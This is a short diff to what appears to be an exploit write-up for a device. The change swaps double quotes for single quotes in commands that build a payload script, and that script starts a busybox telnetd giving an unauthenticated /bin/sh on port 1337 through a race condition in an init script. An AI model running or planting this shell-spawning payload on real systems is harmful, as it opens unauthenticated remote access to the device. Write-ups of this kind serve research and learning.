@@ -122,10 +122,10 @@ Here, we need to exploit a race condition in an init script to spawn a `telnetd`
 
 First, you will need to create two files:
 ```
-echo -n "LMAO" > test.mod
+echo -n 'LMAO' > test.mod
 
-echo "#!/bin/sh" > payload.sh
-echo "/bin/busybox telnetd -l /bin/sh -p 1337 &" >> payload.sh
+echo '#!/bin/sh' > payload.sh
+echo '/bin/busybox telnetd -l /bin/sh -p 1337 &' >> payload.sh
 
 chmod +x payload.sh
 ```
